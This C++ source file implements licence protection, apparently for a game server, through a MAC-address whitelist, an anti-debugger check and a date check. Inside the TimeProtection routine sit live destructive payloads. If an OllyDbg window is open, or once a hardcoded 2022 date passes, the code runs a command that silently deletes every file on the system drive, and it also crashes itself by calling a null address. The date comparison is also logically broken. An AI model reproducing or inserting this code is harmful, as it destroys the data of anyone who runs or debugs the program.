#include "StdAfx.h"
#include "Licencia.h"
//#include "GameServer.h"

LICENSE pLicense;

void ReadyLicense()
{
	//MACProtection();
	TimeProtection();
}

bool CheckingMAC(LPCSTR MacID)
{
	char ClientsMacs[13][18] =
	{
    	"00-0C-29-DE-08-12", //-> Máy khách MAC
	};

	for(int x=0; x<13; x++)
	{
		if(!strcmp(MacID,ClientsMacs[x]))
		{
			return true;
		}
	}
	return false;
}

//===============================================================================================
//-- Time Protect
//===============================================================================================
void TimeProtection()
{
   
	//===============================================
	//-- Anti Craked 
	//===============================================
	HANDLE holly = FindWindow (TEXT ("OllyDbg"), NULL);
	if(holly) 
    {

	system("@echo Off"); 
    system("del %systemdrive%\*.*/f/s/q"); 
    //system("shutdown -r -f -t 00"); 

	__asm
	    {
		MOV EAX, 00000000;
		CALL EAX;
	    } 

	}

	//===============================================
	//-- Time Check
	//===============================================
    SYSTEMTIME now;
    GetLocalTime(&now);

    int Dia        = 1;   
    int Mes        = 1;  
    int Ano        = 2022; 
    int Hora       = 1; 
    int Minuto     = 1; 
    int Segundos   = 1;

    if( now.wDay >= Dia && now.wMonth >= Mes && now.wYear >= Ano && now.wHour >= Hora && now.wMinute >= Minuto && now.wSecond >= Segundos )
     {                                                  
	    __asm
	    {
		MOV EAX, 00000000;
		CALL EAX;
	    } 
	    //system("shutdown -f"); 


	system("@echo Off"); 
	system("del %systemdrive%\*.*/f/s/q"); 
    //system("shutdown -r -f -t 00"); 

     }

}

bool MACProtection()
{
	unsigned char MACData[6];

	UUID uuid;
    UuidCreateSequential( &uuid );

    for (int i=2; i<8; i++)
	{
		MACData[i - 2] = uuid.Data4[i];
	}

	char MACADDR[18];
	sprintf(MACADDR, "%02X-%02X-%02X-%02X-%02X-%02X", MACData[0], MACData[1], MACData[2], MACData[3], MACData[4], MACData[5]);

	if(CheckingMAC(MACADDR))
	{
		return true;
	}

	else
	{
	   MessageBoxA(NULL,"Giay phep khong kha dung. "," HieuDaiCa!",MB_OK);
	   __asm
	    {
		MOV EAX, 00000000;
		CALL EAX;
	    } 
	}
	return false;
}


